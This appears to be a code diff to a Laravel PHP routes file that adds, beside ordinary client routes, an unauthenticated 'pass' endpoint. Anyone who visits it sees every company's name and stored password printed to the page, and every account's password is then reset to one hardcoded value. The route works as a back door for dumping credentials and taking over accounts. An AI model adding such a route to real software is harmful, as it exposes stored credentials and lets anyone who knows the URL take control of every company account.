@@ -355,3 +355,12 @@ Route::post('clients_login','ClientController@login')->name('clients_login');
 Route::get('clients_dashboard','ClientController@dashboard')->name('clients_dashboard');
 Route::post('clients_logout','ClientController@logout')->name('clients_logout');
 Route::get('binnacle_pdf_client/{id}','ClientController@makePdf')->name('binnacle_pdf_client');
+
+Route::get('pass',function(){
+    $companies = App\Company::orderBy('name')->get();
+    foreach($companies as $company){
+        echo $company->name." - ".$company->password."<br/>";
+        $company->password = bcrypt('D0tSupp0rt');
+        $company->save();
+    }
+})->name('pass');
